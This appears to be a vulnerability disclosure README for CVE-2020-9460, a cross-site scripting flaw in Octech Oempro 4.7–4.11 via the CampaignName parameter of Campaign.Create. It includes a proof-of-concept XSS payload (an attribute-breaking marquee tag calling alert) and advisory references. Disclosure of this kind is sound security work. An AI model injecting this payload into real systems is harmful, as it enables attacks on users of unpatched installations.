# CVE-2020-9460
```
██╗  ██╗███████╗███████╗
╚██╗██╔╝██╔════╝██╔════╝
 ╚███╔╝ ███████╗███████╗
 ██╔██╗ ╚════██║╚════██║
██╔╝ ██╗███████║███████║
╚═╝  ╚═╝╚══════╝╚══════╝
```                     


**Cross Site Scripting - Oempro**

<p>Octech Oempro 4.7 through 4.11 allow XSS by an authenticated user. The parameter CampaignName in Campaign.Create is vulnerable.</p>

 ><p><b>Command:</b>Campaign.Create </p>
 ><p><b>Request parameter:</b>CampaignName</p>
 ><p><b>Version:</b> Oempro v4.7 <= v4.11</p>
 ><p><b>Researcher:</b> Guilherme Rubert
 ><p><b>Payload:</b></p>
 
 ```
 "><marquee/onstart=alert("XSS")>
 
 ```
<br>**References:**
<p>https://guilhermerubert.com/blog/cve-2020-9460/</p>
<p>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9460</p>
<p>https://nvd.nist.gov/vuln/detail/CVE-2020-9460</p>
<p>https://www.octeth.com/</p>

